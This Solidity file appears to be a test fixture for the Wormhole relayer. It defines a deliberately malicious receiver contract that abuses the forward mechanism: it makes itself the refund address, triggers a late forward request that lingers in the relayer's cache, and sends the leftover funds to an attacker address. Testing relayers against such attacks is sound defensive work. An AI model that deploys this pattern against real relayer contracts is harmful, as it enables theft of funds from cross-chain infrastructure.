// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../../contracts/interfaces/IWormhole.sol";
import "../../contracts/interfaces/relayer/IWormholeReceiver.sol";
import "../../contracts/interfaces/relayer/IWormholeRelayerUntyped.sol";
import "../../contracts/interfaces/relayer/IRelayProvider.sol";

/**
 * This contract is a malicious "integration" that attempts to attack the forward mechanism.
 */
contract AttackForwardIntegration is IWormholeReceiver {
    mapping(bytes32 => bool) consumedMessages;
    address attackerReward;
    IWormhole wormhole;
    IWormholeRelayer core_relayer;
    uint32 nonce = 1;
    uint16 targetChainId;

    // Capture 30k gas for fees
    // This just needs to be enough to pay for the call to the destination address.
    uint32 SAFE_DELIVERY_GAS_CAPTURE = 30000;

    constructor(
        IWormhole initWormhole,
        IWormholeRelayer initCoreRelayer,
        uint16 chainId,
        address initAttackerReward
    ) {
        attackerReward = initAttackerReward;
        wormhole = initWormhole;
        core_relayer = initCoreRelayer;
        targetChainId = chainId;
    }

    // This is the function which receives all messages from the remote contracts.
    function receiveWormholeMessages(
        DeliveryData memory deliveryData,
        bytes[] memory vaas
    ) public payable override {
        // Do nothing. The attacker doesn't care about this message; he sends it himself.
    }

    receive() external payable {
        // Request forward from the relayer network
        // The core relayer could in principle accept the request due to this being the target of the message at the same time as being the refund address.
        // Note that, if succesful, this forward request would be processed after the time for processing forwards is past.
        // Thus, the request would "linger" in the forward request cache and be attended to in the next delivery.
        forward(targetChainId, attackerReward);
    }

    function forward(uint16 _targetChainId, address attackerRewardAddress) internal {
        (uint256 deliveryPayment,) = core_relayer.quoteEVMDeliveryPrice(
            _targetChainId, 0, SAFE_DELIVERY_GAS_CAPTURE
        );

        bytes memory emptyArray;
        core_relayer.forwardToEvm{value: deliveryPayment + wormhole.messageFee()}(
            _targetChainId,
            attackerRewardAddress,
            emptyArray,
            0,
            SAFE_DELIVERY_GAS_CAPTURE,
            _targetChainId,
            // All remaining funds will be returned to the attacker
            attackerRewardAddress
        );
    }

    function toWormholeFormat(address addr) public pure returns (bytes32 whFormat) {
        return bytes32(uint256(uint160(addr)));
    }
}
